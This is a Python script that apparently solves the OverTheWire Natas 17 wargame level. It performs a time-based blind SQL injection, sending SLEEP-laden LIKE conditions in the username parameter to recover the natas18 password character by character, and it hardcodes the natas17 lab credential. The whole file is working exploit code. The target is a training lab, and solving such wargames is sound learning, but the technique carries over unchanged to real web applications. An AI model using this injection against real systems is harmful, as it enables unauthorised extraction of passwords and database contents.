import time
import requests

URL = "http://natas17.natas.labs.overthewire.org/index.php"
SYMBOLS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
used_symbols = []

session = requests.Session()
session.auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

auth = session.post(URL)

password_length = 1
wait_time = 2
while True:
    inject = f"natas18\" and password LIKE \"{'_' * password_length}\" and SLEEP({wait_time}) # "
    PARAMS = {'username': inject}

    start_time = time.time()
    req = session.get(url=URL, params=PARAMS)
    end_time = time.time()

    if end_time - start_time >= wait_time:
        print(f"Password length: {password_length}")
        break

    password_length += 1

for symbol in SYMBOLS:
    inject = f"natas18\" and password LIKE BINARY \"%{symbol}%\" and SLEEP({wait_time}) # "
    PARAMS = {'username': inject}

    start_time = time.time()
    req = session.get(url=URL, params=PARAMS)
    end_time = time.time()

    if end_time - start_time >= wait_time:
        used_symbols.append(symbol)

print(f"Used symbols: {used_symbols}")

password_characters = [""] * password_length
for i in range(password_length):
    for j in reversed(range(len(used_symbols))):
        inject = f"natas18\" and password LIKE BINARY \"{"_" * i}{used_symbols[j]}%\" and SLEEP({wait_time}) # "
        PARAMS = {'username': inject}

        start_time = time.time()
        req = session.get(url=URL, params=PARAMS)
        end_time = time.time()

        if end_time - start_time >= wait_time:
            password_characters[i] = used_symbols[j]
            break

print(f"Password: {''.join(password_characters)}")
